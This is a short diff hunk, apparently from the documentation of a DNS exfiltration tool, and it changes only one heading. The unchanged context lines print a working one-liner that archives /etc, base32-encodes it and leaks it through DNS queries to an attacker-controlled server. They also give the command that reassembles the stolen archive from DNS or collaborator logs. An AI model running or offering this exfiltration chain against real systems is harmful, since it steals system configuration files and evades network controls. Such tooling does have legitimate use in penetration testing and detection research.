@@ -69,7 +69,7 @@ Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It 
 tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
-Decode the tar archive:
+Decode/save the tar archive:
 
 ```
 ./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d > exfiltrated.tgz
